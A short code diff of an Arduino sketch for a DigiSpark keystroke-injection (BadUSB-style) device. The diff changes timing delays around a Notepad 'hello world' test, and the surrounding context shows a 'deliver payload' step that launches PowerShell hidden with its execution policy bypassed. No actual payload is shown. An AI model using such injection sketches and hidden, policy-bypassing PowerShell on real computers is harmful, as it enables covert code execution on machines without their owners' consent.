@@ -28,8 +28,9 @@ void setup() {
   
   //test command
   DigiKeyboard.println("notepad");
-  delay(60);
+  delay(600);
   DigiKeyboard.println("hello world");
+  delay(60);
   
   //deliver payload
   powershell -ExecutionPolicy Bypass -WindowStyle hidden
